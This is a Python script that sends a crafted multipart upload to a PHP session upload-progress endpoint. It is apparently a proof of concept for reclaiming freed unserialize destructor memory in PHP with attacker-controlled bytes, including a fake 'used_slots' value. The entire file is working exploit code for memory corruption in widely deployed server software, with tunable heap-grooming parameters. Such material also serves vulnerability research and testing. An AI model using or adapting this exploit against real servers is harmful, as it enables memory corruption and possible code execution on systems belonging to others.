#!/usr/bin/env python3
"""Multipart consumer that reclaims the stale unserialize state with raw bytes.

Usage: send_reclaim.py <port> <sid> [big_pages] [big_count] [used_slots] [dt_size] [boundary_len]
  big_pages   page count of each large padding field value (default 256)
  big_count   number of padding fields (default 1)
  used_slots  signed 64-bit fake var_dtor_entries.used_slots (default -2)
  dt_size     byte length of the raw buffer placed on the destructor block
              (default 4096; 2 pages with the allocator header)
  boundary    multipart boundary length (default 8)

Layout: progress field, padding fields, one raw field sized for the freed
var_dtor_entries block whose first 8 bytes are used_slots, then the file part
that makes rfc1867 call the session decode before Basic's RINIT.
"""
import socket
import sys

port = int(sys.argv[1])
sid = sys.argv[2]
big_pages = int(sys.argv[3]) if len(sys.argv) > 3 else 256
big_count = int(sys.argv[4]) if len(sys.argv) > 4 else 1
used_slots = int(sys.argv[5]) if len(sys.argv) > 5 else -2
dt_size = int(sys.argv[6]) if len(sys.argv) > 6 else 4096
boundary_len = int(sys.argv[7]) if len(sys.argv) > 7 else 8

boundary = b"Z" * boundary_len
D = b"--" + boundary + b"\r\n"
big_size = big_pages * 4096 - 17
big_bytes = used_slots.to_bytes(8, "little", signed=True) + b"B" * (big_size - 8)

body = D + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
for i in range(big_count):
    body += D + (b'Content-Disposition: form-data; name="g%d"\r\n\r\n' % i) + big_bytes + b"\r\n"
if dt_size >= 8:
    body += D + b'Content-Disposition: form-data; name="d"\r\n\r\n' + \
            used_slots.to_bytes(8, "little", signed=True) + b"Q" * (dt_size - 8) + b"\r\n"
body += D + b'Content-Disposition: form-data; name="f"; filename="t"\r\n\r\nZ\r\n'
body += b"--" + boundary + b"--\r\n"

req = (
    b"POST /progress.php HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
    b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
    b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    b"Connection: close\r\n\r\n"
) + body

s = socket.create_connection(("127.0.0.1", port), timeout=30)
s.sendall(req)
resp = b""
try:
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        resp += chunk
except socket.timeout:
    pass
finally:
    s.close()

head, _, payload = resp.partition(b"\r\n\r\n")
print(head.split(b"\r\n", 1)[0].decode("latin-1"))
sys.stdout.buffer.write(payload[:2000])
sys.stdout.write("\n")
